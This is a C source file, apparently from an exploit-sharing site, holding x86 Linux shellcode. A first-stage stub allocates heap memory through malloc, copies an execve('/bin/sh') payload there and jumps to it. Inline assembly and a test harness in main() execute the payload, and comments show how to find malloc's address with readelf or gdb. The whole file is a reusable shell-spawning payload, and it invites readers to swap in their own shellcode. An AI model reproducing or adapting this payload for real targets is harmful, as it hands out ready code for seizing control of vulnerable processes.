/* SHeap
 *
 * Compile with: gcc sheap.c -o sheap
 *
 * $ sheap
 * sh-2.05b$
 *
 * Coded by Shen139
 *  shen139 (at) eviltime [dot] com
 *
 */

char shellcode[] =	"\x31\xc0\xb0\x20\x50\xb8\x58\x82\x04\x08\xff\xd0\x8b\x4c\x24"
			"\x10\xeb\x1a\x5b\x31\xd2\xb2\x0a\x51\x8b\x03\x89\x01\x83\xc3\x04\x83"
			"\xc1\x04\x4a\x31\xc0\x39\xc2\x75\xef\x59\xff\xe1\xe8\xe1\xff\xff\xff"
			//  /bin/sh' shellcode
			"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53"
			"\x89\xe1\x89\xca\xb0\x0b\xcd\x80";

void funct()
{

	asm volatile(
	"xor    %eax,%eax\n"
	"movb $0x20,%al\n"		//Allocate space needed by "/bin/sh' shellcode"
	"push %eax\n"
	"mov $0x8048258,%eax\n"		//malloc addr	(Relative)
					/* How to get it?
					 *
					 * $ readelf -r sheap  | grep malloc
					 * 08049618  00000107 R_386_JUMP_SLOT   08048258   malloc
					 *
					 * OR
					 *
					 * (gdb) x malloc
					 * 0x8048258 <malloc>:     0x961825ff
					 *
					 * OR
					 *
					 * (gdb) info symbol malloc
					 * malloc in section .text
					 * (gdb) info functions malloc
					 * All functions matching regular expression "malloc":
					 * Non-debugging symbols:
					 * 0x08048258  malloc
					 * ...
					 *
					 * OR
					 *
					 * gdb sheap -> disassemble malloc:
					 * 0x8048258 <malloc>:     jmp    *0x8049624
					 * 0x804825e <malloc+6>:   push   $0x0
					 * 0x8048263 <malloc+11>:  jmp    0x8048248 <_init+24>
					 *
					 *
					 * and so on :)
					 *
					 */

	"call   *%eax\n"
	"mov 16(%esp),%ecx\n"		//Change it if really used as shellcode
	"jmp label\n"
	"label2:\n"
	"pop %ebx\n"
	"xor %edx,%edx\n"
	"movb $0xa,%dl\n"
	"push %ecx\n"
	"label3:\n"
	"mov (%ebx),%eax\n"
	"mov %eax,(%ecx)\n"
	"addl $0x4, %ebx\n"
	"addl $0x4, %ecx\n"
	"dec %edx\n"
	"xor %eax,%eax\n"
	"cmp %eax,%edx\n"
	"jne label3\n"
	"pop %ecx\n"
	"jmp *%ecx\n"
	"label:\n"
	"call label2\n"
	".string \"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xca\xb0\x0b\xcd\x80\"\n"	//Put here ur own shellcode
	);
}

int main()
{
char *unused=malloc(10);
int (*pFunct)();

	pFunct = (int (*)()) shellcode;

	(int)(*pFunct)();
}

/*EOF*/
